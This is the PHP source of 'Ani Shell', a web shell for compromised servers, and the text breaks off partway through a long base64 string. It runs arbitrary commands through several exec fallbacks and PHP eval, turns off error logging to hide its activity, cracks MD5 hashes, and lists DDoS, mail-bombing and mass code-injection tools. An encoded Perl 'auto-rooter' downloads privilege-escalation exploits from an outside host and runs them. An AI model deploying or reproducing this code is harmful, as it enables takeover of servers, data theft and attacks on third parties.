<?php
/*
[]========================================
[]--------------Ani Shell-----------------
[]----------------------------------------
[]========================================
[]>>>>>>>>> c0d3d by lionaneesh <<<<<<<<<<
[]========================================
[]+  Email: lionaneesh@gmail.com         +
[]+  Twitter : twitter.com/lionaneesh    +
[]========================================
[]
[]
[]
[]
[]
[]
[]
[]
[]
[]  C0de For India
[]  Hack For India
[]  Live for India
[]
[]

Jai Hind
*/

ini_set('max_execution_time',0);
ini_set('memory_limit','999999999M');


function Zip($source, $destination) // Thanks to Alix Axel
{
    if (!extension_loaded('zip') || !file_exists($source)) {
        return false;
    }

    $zip = new ZipArchive();
    if (!$zip->open($destination, ZIPARCHIVE::CREATE)) {
        return false;
    }

    $source = str_replace('\\', '/', realpath($source));

    if (is_dir($source) === true)
    {
        $files = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($source), RecursiveIteratorIterator::SELF_FIRST);

        foreach ($files as $file)
        {
            $file = str_replace('\\', '/', realpath($file));

            if (is_dir($file) === true)
            {
                $zip->addEmptyDir(str_replace($source . '/', '', $file . '/'));
            }
            else if (is_file($file) === true)
            {
                $zip->addFromString(str_replace($source . '/', '', $file), file_get_contents($file));
            }
        }
    }
    else if (is_file($source) === true)
    {
        $zip->addFromString(basename($source), file_get_contents($source));
    }

    return $zip->close();
}

if(isset($_GET['zip'])) {
	$src = $_GET['zip'];
	$dst = getcwd()."/".basename($_GET['zip']).".zip";
	if (Zip($src, $dst) != false) {
		$filez = file_get_contents($dst);
		header("Content-type: application/octet-stream");
		header("Content-length: ".strlen($filez));
		header("Content-disposition: attachment; filename=\"".basename($dst)."\";");
		echo $filez;
	}
	exit;
}

// ------------------------------------- Some header Functions (Need to be on top) ---------------------------------\

/**************** Defines *********************************/

$greeting 		= "0x xx W3lc0m3 M4st3r xx x0";
$user 			= "lionaneesh";
$pass 			= "lionaneesh";
$lock 			= "on"; // set this to off if you dont need the login page
$antiCrawler 		= "off"; // set this to on if u dont want your shell to be publicised in Search Engines ! (It increases the shell's Life')
$tracebackFeature 	= "off"; // set this feature to on to enable email alerts
$ownerEmail 		= "lionaneesh@gmail.com"; // Change this to your email , This email is used to deliver tracebacks about your shell
$url 			= (!empty($_SERVER['HTTPS'])) ? "https://".$_SERVER['SERVER_NAME'].$_SERVER['REQUEST_URI'] : "http://".$_SERVER['SERVER_NAME'].$_SERVER['REQUEST_URI'];
$phpVersion		= phpversion();
$self			= $_SERVER["PHP_SELF"]; // Where am i
$sm 			= @ini_get('safe_mode');
$SEPARATOR 		= '/'; // Default Directory separator
$os 			= "N/D";

if(stristr(php_uname(),"Windows"))
{
        $SEPARATOR = '\\';
        $os = "Windows";
}

else if(stristr(php_uname(),"Linux"))
{
        $os = "Linux";
}

//*************************************************************/

// -------------- Traceback Functions

function sendLoginAlert()
{
    global $ownerEmail;
    global $url;
    $accesedIp = $_SERVER['REMOTE_ADDR'];
    $randomInt = rand(0,1000000);           # to avoid id blocking
    $from = "ani-shell$randomInt@fbi.gov"; 
    
    //echo $from;
    
    if(function_exists('mail'))
    {
        $subject = "Shell Accessed -- Ani-Shell --";
        $message = "
Hey Owner ,
        
        Your Shell(Ani-Shell) located at $url was accessed by $accesedIp
        
        If its not you :-
        
        1. Please check if the shell is secured.
        2. Change your user name and Password.
        3. Check if lock is 0n!

        Thanking You
        
Yours Faithfully
Ani-Shell
        ";
        mail($ownerEmail,$subject,$message,'From:'.$from);
    }
}

//---------------------------------------------------------


if(function_exists('session_start') && $lock == 'on')
{
    session_start();
}
else
{
    // The lock will be set to 'off' if the session_start fuction is disabled i.e if sessions are not supported 
    $lock = 'off';
}

//logout

if(isset($_GET['logout']) && $lock == 'on')
{
    $_SESSION['authenticated'] = 0;
    session_destroy();
    header("location: ".$_SERVER['PHP_SELF']);
}

ini_set('max_execution_time',0);



/***************** Restoring *******************************/


ini_restore("safe_mode_include_dir");
ini_restore("safe_mode_exec_dir");
ini_restore("disable_functions");
ini_restore("allow_url_fopen");
ini_restore("safe_mode");
ini_restore("open_basedir");

if(function_exists('ini_set'))
{
    ini_set('error_log',NULL);  // No alarming logs
    ini_set('log_errors',0);    // No logging of errors
    ini_set('file_uploads',1);  // Enable file uploads
    ini_set('allow_url_fopen',1);   // allow url fopen 
}

else
{
    ini_alter('error_log',NULL);
    ini_alter('log_errors',0);
    ini_alter('file_uploads',1);
    ini_alter('allow_url_fopen',1);
}

// ----------------------------------------------------------------------------------------------------------------


?>
<html>
<head>
<title>Ani-Shell | India</title>

<?php
if($antiCrawler != 'off')
{
    ?>
    <meta name="ROBOTS" content="NOINDEX, NOFOLLOW" />
    <?php
}
?>

<style>

/*
==========================    
    CSS Section
==========================
*/

* {
    padding:0;
    margin:0;
}

html, body {
	height: 100%;
}

#container {
min-height: 100%;
margin-bottom: -330px;
position: relative;
}

#footer {
height: 330px;
position: relative;
}

.clearfooter {
height: 330px;
clear: both;
}

.alert
{
    background:red;
    color:white;
    font-weight:bold;
}
td.info
{
    width:0px;
}

.bind 
{
    border: 1px solid #333333;
    margin: 15px auto 0;
    font-size: small;
}

div.end *
{
    font-size:small;
}

div.end 
{
    width:100%;
    background:#222;
}

p.blink
{
    text-decoration: blink;
}

body 
{
    background-color:black;
    color:rgb(35,182,39);
    font-family:Tahoma,Verdana,Arial;
    font-size: small;
}

input.own {
    background-color: Green;
    color: white;
    border : 1px solid #ccc;
}

blockquote.small
{
    font-size: smaller;
    color: silver;
    text-align: center;
}

table.files
{
    border-spacing: 10px;
    font-size: small;
}

h1 {
    padding: 4px;
    padding-bottom: 0px;
    margin-right : 5px;
}
div.logo
{
    border-right: 1px aqua solid;
}
div.header
{
    padding-left: 5px;
    font-size: small;
    text-align: left;
}
div.nav
{
    margin-top:1px;
    height:60px;
    background-color: #ccc;
}
div.nav ul
{
    list-style: none;
    padding: 4px;
}
div.nav li
{
    float: left;
    margin-right: 10px;
    text-align:center;
}
textarea.cmd
{
    border : 1px solid #111;
    background-color : green;
    font-family: Shell;
    color : white;
    margin-top: 30px;
    font-size:small;
}

input.cmd
{
    background-color:black;
    color: white;
    width: 400px;
    border : 1px solid #ccc;

}
td.maintext
{
    font-size: large;
}
#margins
{
    margin-left: 10px;
    margin-top: 10px;
    color:white;
}
table.top
{
    border-bottom: 1px solid aqua;
    width: 100%;
}
#borders
{
    border-top : 1px solid aqua;
    border-left:1px solid aqua;
    border-bottom: 1px solid aqua;
    border-right: 1px solid aqua;
    margin-bottom:0;
}
td.file a , .file a
{
    text-decoration:none;
}
a.dir
{
    font-weight:bold;
    text-decoration:none;
}
td.dir a
{
    text-decoration:none;
}
td.download,td.download2
{
    color:green;
}
#spacing
{
    padding:10px;
    margin-left:200px;
}
th.header
{
    background: none repeat scroll 0 0 #191919;
    color: white;
    border-bottom : 1px solid #333333;
}
p.alert_red
{
    background : red;
    color: white;
}

p.alert_green
{
    background : lightgreen;
    color: black;
}
/*

--------------------------------CSS END------------------------------------------------------

*/
</style>

</head>

<body text="rgb(39,245,10)" bgcolor="black">

<div id='container'>
<?php
if(isset($_POST['user']) && isset($_POST['pass']) && $lock == 'on')
{
    if( $_POST['user'] == $user &&
         $_POST['pass'] == $pass )
    {
            $_SESSION['authenticated'] = 1;
            // --------------------- Tracebacks --------------------------------
            if($tracebackFeature == 'On')
            {
                sendLoginAlert();
            }
            // ------------------------------------------------------------------
    }
}

if($lock == 'off')
{?>
    <p class="alert_red"><b>Lock is Switched Off! , The shell can be accessed by anyone!</b></p>
<?php
}

if($lock == 'on' && (!isset($_SESSION['authenticated']) || $_SESSION['authenticated']!=1) )
{

?>
<table>
    <tbody>
        <tr>
            <td width="500px">
        <pre>
<font color="Orange">
<b>
[]========================================
[]--------------Ani Shell-----------------
[]----------------------------------------</font><font color="white">
[]========================================
[]>>>>>>>>> c0d3d by lionaneesh <<<<<<<<<<
[]========================================</font><font color="rgb(35,182,39)">
[]   Email: lionaneesh@gmail.com         +
[]   Twitter : twitter.com/lionaneesh    +
[]========================================</font><font color="grey">
[]
[]
[]
[]
[]
[]
[]
[]
[]
[]  C0de For India
[]  Hack For India
[]  Live for India
[]
[]
</b>
</pre>
            </td>
            <td>
                   <?php
                   // <div id="wassup">
                   //      include("http://ani-shell.sourceforge.net/wassup.txt");
                   //</div>
                   ?>
                   

                <h1><?php echo $greeting;?></h1><br /><br />
                <form method="POST" action="<?php echo $_SERVER['PHP_SELF'];?>">
                <input name="user" value="Username"/> <input name="pass" type="password" value="Password"/> <input class="own" type="Submit" value="Own This Box!"/>
                </form>
            </td>
        </tr>
    </tbody>
</table>
<?php
}
//---------------------------------- We are authenticated now-------------------------------------
//Launch the shell
else 
{
    //---------------------------------- Fuctions ---------------------------------------------------

    function showDrives()
    {
        global $self;
        foreach(range('A','Z') as $drive)
        {
            if(is_dir($drive.':\\'))
            {
                ?>
                <a class="dir" href='<?php echo $self ?>?dir=<?php echo $drive.":\\"; ?>'>
                    <?php echo $drive.":\\" ?>
                </a> 
                <?php
            }
        }
    }

    function HumanReadableFilesize($size)
    {
 
        $mod = 1024;
 
        $units = explode(' ','B KB MB GB TB PB');
        for ($i = 0; $size > $mod; $i++) 
        {
            $size /= $mod;
        }
 
        return round($size, 2) . ' ' . $units[$i];
    }

function getClientIp()
{
    echo $_SERVER['REMOTE_ADDR'];
}

function getServerIp()
{
    echo getenv('SERVER_ADDR');
}
function getSoftwareInfo()
{
    echo php_uname();
}
function diskSpace()
{
    echo HumanReadableFilesize(disk_total_space("/"));
}
function freeSpace()
{
    echo HumanReadableFilesize(disk_free_space("/"));
}
function getSafeMode()
{
        global $sm;
		echo($sm?"ON (Most of the Features will Not Work)":"OFF");
        
}

function getDisabledFunctions()
{
    if(!ini_get('disable_functions'))
    {
		echo "None";
    }
    else
    {
			echo @ini_get('disable_functions');
    }
}

function getFilePermissions($file)
{
    
$perms = fileperms($file);

if (($perms & 0xC000) == 0xC000) {
    // Socket
    $info = 's';
} elseif (($perms & 0xA000) == 0xA000) {
    // Symbolic Link
    $info = 'l';
} elseif (($perms & 0x8000) == 0x8000) {
    // Regular
    $info = '-';
} elseif (($perms & 0x6000) == 0x6000) {
    // Block special
    $info = 'b';
} elseif (($perms & 0x4000) == 0x4000) {
    // Directory
    $info = 'd';
} elseif (($perms & 0x2000) == 0x2000) {
    // Character special
    $info = 'c';
} elseif (($perms & 0x1000) == 0x1000) {
    // FIFO pipe
    $info = 'p';
} else {
    // Unknown
    $info = 'u';
}

// Owner
$info .= (($perms & 0x0100) ? 'r' : '-');
$info .= (($perms & 0x0080) ? 'w' : '-');
$info .= (($perms & 0x0040) ?
            (($perms & 0x0800) ? 's' : 'x' ) :
            (($perms & 0x0800) ? 'S' : '-'));

// Group
$info .= (($perms & 0x0020) ? 'r' : '-');
$info .= (($perms & 0x0010) ? 'w' : '-');
$info .= (($perms & 0x0008) ?
            (($perms & 0x0400) ? 's' : 'x' ) :
            (($perms & 0x0400) ? 'S' : '-'));

// World
$info .= (($perms & 0x0004) ? 'r' : '-');
$info .= (($perms & 0x0002) ? 'w' : '-');
$info .= (($perms & 0x0001) ?
            (($perms & 0x0200) ? 't' : 'x' ) :
            (($perms & 0x0200) ? 'T' : '-'));

return $info;

}

// Dir size

/**
 * Get the directory size
 * @param directory $directory
 * @return integer
 */
function dirSize($directory) {
    $size = 0;
    foreach(new RecursiveIteratorIterator(new RecursiveDirectoryIterator($directory)) as $file){
        try {       
            $size += $file->getSize();
        }
        catch (Exception $e){    // Symlinks and other shits
            $size += 0;
        }
    }
    return $size;
}

/***********************************************************/
// exec_all , A function used to execute commands , This function will only execute if the Safe Mode is
// Turned OFF!
/**********************************************************/


function exec_all($command)
{
    
    $output = '';
    if(function_exists('exec'))
    {   
        exec($command,$output);
        $output = join("\n",$output);
    }
    
    else if(function_exists('shell_exec'))
    {
        $output = shell_exec($command);
    }
    
    else if(function_exists('popen'))
    {
        $handle = popen($command , "r"); // Open the command pipe for reading
        if(is_resource($handle))
        {
            if(function_exists('fread') && function_exists('feof'))
            {
                while(!feof($handle))
                {
                    $output .= fread($handle, 512);
                }
            }
            else if(function_exists('fgets') && function_exists('feof'))
            {
                while(!feof($handle))
                {
                    $output .= fgets($handle,512);
                }
            }
        }
        pclose($handle);
    }
    
    
    else if(function_exists('system'))
    {
        ob_start(); //start output buffering
        system($command);
        $output = ob_get_contents();    // Get the ouput 
        ob_end_clean();                 // Stop output buffering
    }
    
    else if(function_exists('passthru'))
    {
        ob_start(); //start output buffering
        passthru($command);
        $output = ob_get_contents();    // Get the ouput 
        ob_end_clean();                 // Stop output buffering            
    }
    
    else if(function_exists('proc_open'))
    {
        $descriptorspec = array(
                1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
                );
        $handle = proc_open($command ,$descriptorspec , $pipes); // This will return the output to an array 'pipes'
        if(is_resource($handle))
        {
            if(function_exists('fread') && function_exists('feof'))
            {
                while(!feof($pipes[1]))
                {
                    $output .= fread($pipes[1], 512);
                }
            }
            else if(function_exists('fgets') && function_exists('feof'))
            {
                while(!feof($pipes[1]))
                {
                    $output .= fgets($pipes[1],512);
                }
            }
        }
        pclose($handle);
    }

    return(htmlspecialchars($output));
    
}

function magicQuote($text)
{
    if (!get_magic_quotes_gpc())
    {
        return $text;
    }
    return stripslashes($text);
}

function md5Crack($hash , $list)
{
    $fd = fopen($list,"r");
    if( strlen($hash) != 32  || $fd == FALSE)
    {
        // echo "$hash , " . strlen($hash) ." , $list , $fd"; // Debugging
        return "<p class='alert_red'>Hash or List invalid!</p>";
    }
    else
    {
        while (! feof( $fd ))
        {
            if( ($pwdList = fgets( $fd, 1024 )) == FALSE)
            {
                break;
            }
            $pwdList = trim($pwdList);
            
            if(md5($pwdList) == $hash )
            {
                    return "<script>alert('Password Cracked');</script>\n<h2>Hash Cracked</h2><br /><br />\n<p class='alert_green'>Planintext : $pwdList</p>";
            }
        }
            
    }
}

function exec_query_mysql($query,$sql_server,$sql_port,$sql_db,$sql_user,$sql_pass)
{
    $link = mysql_connect($sql_server.":".$port,$sql_user,$sql_pass);
    if(!$link)
    {
        return 'Could not connect: ' . mysql_error();
    }
    $resource = mysql_query($query);
    if(!$resource) return(mysql_error());
}

//------------------------------------------------------------------------------------------------


?>

<table class="top">
    <tbody>
        <tr>
            <td width="300px;">
            <div class="logo">
                <img src="http://ani-shell.sourceforge.net/banner.jpg" />
            </div>
            </td>
            <td>
            <div class="header">
            <?php getSoftwareInfo(); ?><br />
Your IP : <?php getClientIp(); ?> <font color="silver" >|</font> Server IP : <?php getServerIp();?> <br />
            Safe Mode : <?php getSafeMode(); ?><br />
            <?php if($os == 'Windows'){ echo showDrives();} ?> <?php echo getcwd();?>
            </div>
            </td>
        </tr>
    </tbody>
</table>
<div class="header" id="borders">
            Server ADMIN: <?php echo $_SERVER['SERVER_ADMIN'];?> <font color="silver" >|</font>
            PHP VERSION : <?php echo $phpVersion; ?> <font color="silver" >|</font>
            Curl : <?php echo function_exists('curl_version')?("<font color='red'>Enabled</font>"):("Disabled"); ?> <font color="silver" >|</font>
            Oracle : <?php echo function_exists('ocilogon')?("<font color='red'>Enabled</font>"):("Disabled"); ?> <font color="silver" >|</font>
            MySQL : <?php  echo function_exists('mysql_connect')?("<font color='red'>Enabled</font>"):("Disabled");?> <font color="silver" >|</font>
            MSSQL : <?php echo function_exists('mssql_connect')?("<font color='red'>Enabled</font>"):("Disabled"); ?> <font color="silver" >|</font>
            PostgreSQL : <?php echo function_exists('pg_connect')?("<font color='red'>Enabled</font>"):("Disabled"); ?> <font color="silver" >|</font>
            Disable functions : <?php getDisabledFunctions(); ?> <font color="silver" >|</font>
            Space : <?php diskSpace(); ?> <font color="silver" >|</font>
            Free : <?php freeSpace(); ?>
        </table>
</div>
<div class="nav">
<ul>
    <li><a href="<?php echo $self;?>">Home</a></li>
    <li><a href="<?php echo $self.'?upload';?>">Upload</a></li>
    <li><a href="<?php echo $self.'?shell';?>">Shell</a></li>
    <li><a href="<?php echo $self.'?r00t'?>">Aut0 R00t3r (Unix/Linux)</a></li>
    <li><a href="<?php echo $self.'?dos';?>">DDoS</a></li>
    <li><a href="<?php echo $self.'?fuzz';?>">Web-Server Fuzzer</a></li>
    <li><a href="<?php echo $self.'?mail'?>">Mass Mailer</a></li>
    <li><a href="<?php echo $self.'?bomb'?>">Mail Bomber</a></li>
    <li><a href="<?php echo $self.'?connect'?>">Connect</a></li>
    <li><a href="<?php echo $self.'?injector'?>">Mass Code Injector</a></li>
    <li><a href="<?php echo $self.'?obfuscate'?>">PHP Obfuscator</a></li>
    <li><a href="<?php echo $self.'?eval'?>">PHP Evaluate</a></li>
    <li><a href="<?php echo $self.'?md5'?>">MD5 Cracker</a></li>
    <li><a href="<?php echo $self.'?gdork'?>">Google Dork Creator</a></li>


    <?php if($lock == 'on')
    {
    ?>
        <li><a href="<?php echo $self.'?logout'?>">I m Out!</a></li>
    <?php
    }
    ?>
</ul>
</div>

<center>
<?php
//-------------------------------- Check what he wants -------------------------------------------

// Shell

if(isset($_GET['shell']))
{
    if(!isset($_GET['cmd']) || $_GET['cmd'] == '')
    {
        $result = "";    
    }
    else
    {
        $result=exec_all($_GET['cmd']);
    }
    ?>
    <textarea class="cmd" cols="100" rows="20"><?php echo $result;?></textarea><br /><br />
    <form action="<?php echo $self;?>" method="GET">
    <!-- For Shell -->
    <input name="shell" type="hidden" />
    <!-- For CMD -->
    <input name="cmd" class="cmd" />
    <input name="submit" value="Spin That Shit!" class="own" type="submit" />
    </form>
    <?php
}

// Auto Rooter (Linux/Unix Only!) with Perl Installed

else if(isset($_GET['r00t']))
{
    // Note : The Perl Auto Rooter Perl Script was originally written by iskorpitx , All credits to him for an awesome
    // Piece of code , and thanks to eXes0ul for providing me the links . ;) 
    
    $r00t =
"IyEvdXNyL2Jpbi9wZXJsIA0KIyBFeHBsb2l0IHRvb2xzIHYyLjAgY29kZWQgYnkgaXNrb3JwaXR4
IChUdXJraXNoIEhhY2tlcikNCiMgbGludXggc2VydmVybGVyZGUgZ2VjZXJsaWRpcg0KIyBpeWkg
c2Fuc2xhcjopDQojIGJ5IGlza29ycGl0eA0KeyANCnN5c3RlbSgid2dldCBodHRwOi8vd2FyMTk3
MS5jb20vQ01TX0ZJTEVTL2ZpbGUvY2MvaXNrb3JwaXR4Iik7ICANCnN5c3RlbSgiY2htb2QgNzc3
IGlza29ycGl0eCIpOyANCnN5c3RlbSgiLi9pc2tvcnBpdHgiKTsgDQpzeXN0ZW0oImlkIik7IA0K
c3lzdGVtKCJ3Z2V0IGh0dHA6Ly93YXIxOTcxLmNvbS9DTVNfRklMRVMvZmlsZS9jYy80NCIpOyAg
DQpzeXN0ZW0oImNobW9kIDc3NyA0NCIpOyANCnN5c3RlbSgiLi80NCIpOyANCnN5c3RlbSgiaWQi
KTsNCnN5c3RlbSgid2dldCBodHRwOi8vd2FyMTk3MS5jb20vQ01TX0ZJTEVTL2ZpbGUvY2MvOTUy
MSIpOyAgDQpzeXN0ZW0oImNobW9kIDc3NyA5NTIxIik7IA0Kc3lzdGVtKCIuLzk1MjEiKTsgDQpz
eXN0ZW0oImlkIik7ICANCnN5c3RlbSgid2dldCBodHRwOi8vd2FyMTk3MS5jb20vQ01TX0ZJTEVT
L2ZpbGUvY2MvZnJvb3QiKTsgIA0Kc3lzdGVtKCJjaG1vZCA3NzcgZnJvb3QiKTsgDQpzeXN0ZW0o
Ii4vZnJvb3QiKTsgDQpzeXN0ZW0oImlkIik7DQpzeXN0ZW0oImlkIik7DQpzeXN0ZW0oImlkIik7
DQpzeXN0ZW0oImlkIik7DQpzeXN0ZW0oImlkIik7DQpzeXN0ZW0oIndnZXQgMjc3MDQuYyBkb3du
bG9hZHMuc2VjdXJpdHlmb2N1cy5jb20vdnVsbmVyYWJpbGl0aWVzL2V4cGxvaXRzLzI3NzA0LmMi
KTsgDQpzeXN0ZW0oImdjYyAyNzcwNC5jIC1vIDI3NzA0Iik7ICANCnN5c3RlbSgiY2htb2QgNzc3
IDI3NzA0Iik7IA0Kc3lzdGVtKCIuLzI3NzA0Iik7IA0Kc3lzdGVtKCJpZCIpOyANCnByaW50ICJJ
ZiB1IHIgcjAwdCBzdG9wIHhwbCB3aXRoIGN0cmwrY1xuIjsNCnN5c3RlbSgid2dldCBodHRwOi8v
d2FyMTk3MS5jb20vQ01TX0ZJTEVTL2ZpbGUvY2MvMTgtMS5jIik7IA0Kc3lzdGVtKCJnY2MgLVdh
bGwgLW8gMTgtMSAxOC0xLmMiKTsgDQpzeXN0ZW0oImdjYyAtV2FsbCAtbTY0IC1vIDE4LTMgMTgt
MS5jIik7IA0Kc3lzdGVtKCJjaG1vZCA3NzcgMTgtMSIpOyANCnN5c3RlbSgiY2htb2QgNzc3IDE4
LTMiKTsgDQpzeXN0ZW0oIi4vMTgtMSIpOyANCnN5c3RlbSgiaWQiKTsgDQpzeXN0ZW0oIi4vMTgt
MyIpOyANCnN5c3RlbSgiaWQiKTsgDQpwcmludCAiSWYgdSByIHIwMHQgc3RvcCB4cGwgd2l0aCBj
dHJsK2NcbiI7DQpzeXN0ZW0oIndnZXQgaHR0cDovL3dhcjE5NzEuY29tL0NNU19GSUxFUy9maWxl
L2NjLzE4LTIiKTsgIA0Kc3lzdGVtKCJjaG1vZCA3NzcgMTgtMiIpOyANCnN5c3RlbSgiLi8xOC0y
Iik7IA0Kc3lzdGVtKCJpZCIpOyANCnByaW50ICJJZiB1IHIgcjAwdCBzdG9wIHhwbCB3aXRoIGN0
cmwrY1xuIjsNCnN5c3RlbSgid2dldCBodHRwOi8vd2FyMTk3MS5jb20vQ01TX0ZJTEVTL2ZpbGUv
Y2MvMTgtMSIpOyAgDQpzeXN0ZW0oImNobW9kIDc3NyAxOC0xIik7IA0Kc3lzdGVtKCIuLzE4LTEi
KTsgDQpzeXN0ZW0oImlkIik7IA0KcHJpbnQgIklmIHUgciByMDB0IHN0b3AgeHBsIHdpdGggY3Ry
bCtjXG4iOw0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly93YXIxOTcxLmNvbS9DTVNfRklMRVMvZmlsZS9j
Yy9ydW4iKTsgIA0Kc3lzdGVtKCJjaG1vZCA3NzcgcnVuIik7IA0Kc3lzdGVtKCIuL3J1biIpOyAN
CnN5c3RlbSgiaWQiKTsgDQpwcmludCAiSWYgdSByIHIwMHQgc3RvcCB4cGwgd2l0aCBjdHJsK2Nc
biI7DQpzeXN0ZW0oIndnZXQgaHR0cDovL3dhcjE5NzEuY29tL0NNU19GSUxFUy9maWxlL2NjL2V4
cGxvaXQuYyIpOyAgDQpwcmludCAiSWYgdSByIHIwMHQgc3RvcCB4cGwgd2l0aCBjdHJsK2NcbiI7
DQpzeXN0ZW0oIndnZXQgcnVuX2V4cGxvaXRzLnNoIHdnZXQgaHR0cDovL3dhcjE5NzEuY29tL0NN
U19GSUxFUy9maWxlL2NjL3J1bl9leHBsb2l0cy5zaCIpOyAgDQpzeXN0ZW0oImNobW9kIDc3NyBy
dW5fZXhwbG9pdHMuc2giKTsgDQpzeXN0ZW0oIi4vcnVuX2V4cGxvaXRzLnNoIik7IA0KcHJpbnQg
IklmIHUgciByMDB0IHN0b3AgeHBsIHdpdGggY3RybCtjXG4iOw0Kc3lzdGVtKCJ3Z2V0IGh0dHA6
Ly93YXIxOTcxLmNvbS9DTVNfRklMRVMvZmlsZS9jYy9leHBsb2l0Iik7ICANCnN5c3RlbSgiY2ht
b2QgNzc3IGV4cGxvaXQiKTsgDQpzeXN0ZW0oIi4vZXhwbG9pdCIpOyANCnByaW50ICJJZiB1IHIg
cjAwdCBzdG9wIHhwbCB3aXRoIGN0cmwrY1xuIjsNCnN5c3RlbSgid2dldCBodHRwOi8vd2FyMTk3
MS5jb20vQ01TX0ZJTEVTL2ZpbGUvY2MvcnVuMiIpOyAgDQpzeXN0ZW0oImNobW9kIDc3NyBydW4y
Iik7IA0Kc3lzdGVtKCIuL3J1bjIiKTsgDQpzeXN0ZW0oImlkIik7IA0Kc3lzdGVtKCJ3Z2V0IGV4
cCBodHRwOi8vd2FyMTk3MS5jb20vQ01TX0ZJTEVTL2ZpbGUvY2MvZXhwIik7ICANCnN5c3RlbSgi
Y2htb2QgNzc3IGV4cCIpOyANCnN5c3RlbSgiLi9leHAiKTsgDQpzeXN0ZW0oImlkIik7IA0Kc3lz
dGVtKCJ3Z2V0IGh0dHA6Ly93YXIxOTcxLmNvbS9DTVNfRklMRVMvZmlsZS9jYy9leHAxIik7ICAN
CnN5c3RlbSgiY2htb2QgNzc3IGV4cDEiKTsgDQpzeXN0ZW0oIi4vZXhwMSIpOyANCnN5c3RlbSgi
aWQiKTsgDQpzeXN0ZW0oIndnZXQgaHR0cDovL3dhcjE5NzEuY29tL0NNU19GSUxFUy9maWxlL2Nj
L2V4cDIiKTsgIA0Kc3lzdGVtKCJjaG1vZCA3NzcgZXhwMiIpOyANCnN5c3RlbSgiLi9leHAyIik7
IA0Kc3lzdGVtKCJpZCIpOyANCnN5c3RlbSgid2dldCBodHRwOi8vd2FyMTk3MS5jb20vQ01TX0ZJ
TEVTL2ZpbGUvY2MvZXhwMyIpOyAgDQpzeXN0ZW0oImNobW9kIDc3NyBleHAzIik7IA0Kc3lzdGVt
KCIuL2V4cDMiKTsgDQpzeXN0ZW0oImlkIik7IA0Kc3lzdGVtKCJ3Z2V0IGV4cDQgaHR0cDovL3dh
cjE5NzEuY29tL0NNU19GSUxFUy9maWxlL2NjL2V4cDQiKTsgIA0Kc3lzdGVtKCJjaG1vZCA3Nzcg
ZXhwNCIpOyANCnN5c3RlbSgiLi9leHA0Iik7IA0Kc3lzdGVtKCJpZCIpOyANCnN5c3RlbSgid2dl
dCBodHRwOi8vd2FyMTk3MS5jb20vQ01TX0ZJTEVTL2ZpbGUvY2MvZXhwNSIpOyAgDQpzeXN0ZW0o
ImNobW9kIDc3NyBleHA1Iik7IA0Kc3lzdGVtKCIuL2V4cDUiKTsgDQpzeXN0ZW0oImlkIik7IA0K
c3lzdGVtKCJ3Z2V0IGh0dHA6Ly93YXIxOTcxLmNvbS9DTVNfRklMRVMvZmlsZS9jYy9leHA2Iik7
ICANCnN5c3RlbSgiY2htb2QgNzc3IGV4cDYiKTsgDQpzeXN0ZW0oIi4vZXhwNiIpOyANCnN5c3Rl
bSgiaWQiKTsgDQpzeXN0ZW0oIndnZXQgaHR0cDovL3dhcjE5NzEuY29tL0NNU19GSUxFUy9maWxl
L2NjL2V4cDciKTsgIA0Kc3lzdGVtKCJjaG1vZCA3NzcgZXhwNyIpOyANCnN5c3RlbSgiLi9leHA3
Iik7IA0Kc3lzdGVtKCJpZCIpOyANCnN5c3RlbSgid2dldCBodHRwOi8vd2FyMTk3MS5jb20vQ01T
X0ZJTEVTL2ZpbGUvY2MvZXhwOCIpOyAgDQpzeXN0ZW0oImNobW9kIDc3NyBleHA4Iik7IA0Kc3lz
dGVtKCIuL2V4cDgiKTsgDQpzeXN0ZW0oImlkIik7IA0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly93YXIx
OTcxLmNvbS9DTVNfRklMRVMvZmlsZS9jYy9leHA5Iik7ICANCnN5c3RlbSgiY2htb2QgNzc3IGV4
cDkiKTsgDQpzeXN0ZW0oIi4vZXhwOSIpOyANCnN5c3RlbSgiaWQiKTsgDQpwcmludCAiSWYgdSBy
IHIwMHQgc3RvcCB4cGwgd2l0aCBjdHJsK2NcbiI7DQpzeXN0ZW0oIndnZXQgaHR0cDovL3dhcjE5
NzEuY29tL0NNU19GSUxFUy9maWxlL2NjL3J1bjIiKTsgIA0Kc3lzdGVtKCJjaG1vZCA3NzcgcnVu
MiIpOyANCnN5c3RlbSgiLi9ydW4yIik7IA0Kc3lzdGVtKCJpZCIpOyANCnByaW50ICJJZiB1IHIg
cjAwdCBzdG9wIHhwbCB3aXRoIGN0cmwrY1xuIjsNCnN5c3RlbSgid2dldCBodHRwOi8vd2FyMTk3
MS5jb20vQ01TX0ZJTEVTL2ZpbGUvY2MvcnVuMiIpOyAgDQpzeXN0ZW0oImNobW9kIDc3NyBydW4y
Iik7IA0Kc3lzdGVtKCIuL3J1bjIiKTsgDQpzeXN0ZW0oImlkIik7IA0KcHJpbnQgIklmIHUgciBy
MDB0IHN0b3AgeHBsIHdpdGggY3RybCtjXG4iOw0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly93YXIxOTcx
LmNvbS9DTVNfRklMRVMvZmlsZS9jYy9leHBsb2l0Iik7ICANCnN5c3RlbSgiY2htb2QgNzc3IGV4
cGxvaXQiKTsgDQpzeXN0ZW0oIi4vZXhwbG9pdCIpOyANCnN5c3RlbSgiaWQiKTsgDQpwcmludCAi
SWYgdSByIHIwMHQgc3RvcCB4cGwgd2l0aCBjdHJsK2NcbiI7DQpzeXN0ZW0oIndnZXQgaHR0cDov
L3dhcjE5NzEuY29tL0NNU19GSUxFUy9maWxlL2NjL2V4cGxvaXQyIik7ICANCnN5c3RlbSgiY2ht
b2QgNzc3IGV4cGxvaXQyIik7IA0Kc3lzdGVtKCIuL2V4cGxvaXQyIik7IA0Kc3lzdGVtKCJpZCIp
OyANCnByaW50ICJJZiB1IHIgcjAwdCBzdG9wIHhwbCB3aXRoIGN0cmwrY1xuIjsNCnN5c3RlbSgi
d2dldCBodHRwOi8vd2FyMTk3MS5jb20vQ01TX0ZJTEVTL2ZpbGUvY2MvZXhwbG9pdDIiKTsgIA0K
c3lzdGVtKCJjaG1vZCA3NzcgZXhwbG9pdDIiKTsgDQpzeXN0ZW0oIi4vZXhwbG9pdDIiKTsgDQpz
eXN0ZW0oImlkIik7IA0KcHJpbnQgIklmIHUgciByMDB0IHN0b3AgeHBsIHdpdGggY3RybCtjXG4i
